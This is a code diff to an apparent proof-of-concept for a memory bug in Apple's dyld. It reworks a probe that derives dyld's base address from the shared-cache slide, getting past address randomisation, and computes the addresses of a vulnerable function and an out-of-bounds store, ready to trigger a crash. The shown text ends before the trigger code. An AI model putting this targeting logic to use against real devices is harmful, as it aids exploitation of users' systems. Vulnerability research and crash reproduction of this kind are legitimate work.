@@ -24,6 +24,7 @@
 #include <dlfcn.h>
 #include <sys/mman.h>
 #include <ptrauth.h>
+#include <mach-o/loader.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -31,48 +32,68 @@
 
 #define REC_MARK_OFFSET 0x3b9fc
 #define OOB_STRB_OFFSET 0x3ba84
+#define DYLD_TEXT_VMADDR 0x18047c000ULL
 
 static char g_buf[512];
 
-static int is_dyld_image(const char *name) {
-    if (!name) return 0;
-    /* Must be /usr/lib/dyld (or "dyld"), NOT libdyld.dylib. */
-    size_t n = strlen(name);
-    if (n >= 5 && strcmp(name + n - 5, "/dyld") == 0) return 1;
-    return strcmp(name, "dyld") == 0;
+/* __TEXT vmaddr from a mach_header_64 (every image in the shared cache). */
+static uintptr_t text_vmaddr(const void *mhbase) {
+    const struct mach_header_64 *mh = (const struct mach_header_64 *)mhbase;
+    if (mh->magic != MH_MAGIC_64) return 0;
+    const uint8_t *p = (const uint8_t *)(mh + 1);
+    for (uint32_t i = 0; i < mh->ncmds; i++) {
+        const struct load_command *lc = (const struct load_command *)p;
+        if (lc->cmdsize < sizeof(struct load_command)) return 0;
+        if (lc->cmd == LC_SEGMENT_64) {
+            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
+            if (strcmp(seg->segname, "__TEXT") == 0) return (uintptr_t)seg->vmaddr;
+        }
+        p += lc->cmdsize;
+    }
+    return 0;
 }
 
 const char *probe_crash_dyld(int fire) {
-    /* Try several public dyld-API symbols; keep the one that resolves to the
-     * dyld image itself (dladdr name ending in "/dyld"), not libdyld.dylib. */
+    /* Locate any public dyld API symbol. Whether dlsym resolves it to dyld
+     * itself or to libdyld.dylib, that image is in the SAME dyld shared cache,
+     * so its (load address - __TEXT vmaddr) is the cache slide. Apply that
+     * slide to dyld's fixed __TEXT vmaddr to get dyld's true base. */
     static const char *candidates[] = {
         "dyld_get_image_header", "_dyld_get_image_header",
         "dyld_get_image_name", "_dyld_get_image_name",
         "dyld_get_image_vmaddr_slide", "_dyld_get_image_vmaddr_slide"
     };
-    Dl_info di;
-    int found = 0;
-    const char * lastName = "(none)";
+    Dl_info di; memset(&di, 0, sizeof(di));
+    const char *imageName = "(none)";
     for (unsigned i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
         void *h = dlsym(RTLD_DEFAULT, candidates[i]);
         if (!h) continue;
         Dl_info t; memset(&t, 0, sizeof(t));
-        if (dladdr(h, &t) != 0 && t.dli_fname) {
-            lastName = t.dli_fname;
-            if (is_dyld_image(t.dli_fname)) { di = t; found = 1; break; }
-        }
+        if (dladdr(h, &t) != 0 && t.dli_fname) { di = t; imageName = t.dli_fname; break; }
     }
-    if (!found) {
-        snprintf(g_buf, sizeof(g_buf), "CRASH: no symbol resolved to /usr/lib/dyld (last=%s)", lastName);
+    if (!di.dli_fbase) {
+        snprintf(g_buf, sizeof(g_buf), "CRASH: no dyld API symbol found via dlsym");
         return g_buf;
     }
 
-    uintptr_t base = (uintptr_t)di.dli_fbase;   /* __TEXT vmaddr 0x18047c000 + slide */
+    uintptr_t imgVM = text_vmaddr(di.dli_fbase);
+    if (!imgVM) {
+        snprintf(g_buf, sizeof(g_buf), "CRASH: cannot read __TEXT vmaddr of %s", imageName);
+        return g_buf;
+    }
+    uintptr_t slide = (uintptr_t)di.dli_fbase - imgVM;
+    uintptr_t base  = slide + (uintptr_t)DYLD_TEXT_VMADDR;
+
+    /* Verify the derived dyld base really is dyld before calling into it. */
+    if (text_vmaddr((void *)base) != (uintptr_t)DYLD_TEXT_VMADDR) {
+        snprintf(g_buf, sizeof(g_buf), "CRASH: bad dyld base 0x%lx (via %s)", (unsigned long)base, imageName);
+        return g_buf;
+    }
     uintptr_t fn   = base + REC_MARK_OFFSET;
     uintptr_t strb = base + OOB_STRB_OFFSET;
     snprintf(g_buf, sizeof(g_buf),
-             "CRASH-SETUP lib=%s base=0x%lx fn(recMark)=0x%lx OOB-strb=0x%lx expected-fault-PC=0x%lx",
-             di.dli_fname, (unsigned long)base, (unsigned long)fn,
+             "CRASH-SETUP via=%s slide=0x%lx base=0x%lx fn(recMark)=0x%lx OOB-strb=0x%lx expected-fault-PC=0x%lx",
+             imageName, (unsigned long)slide, (unsigned long)base, (unsigned long)fn,
              (unsigned long)strb, (unsigned long)strb);
     if (!fire) return g_buf;   /* info pass: written to report BEFORE the crash */
 
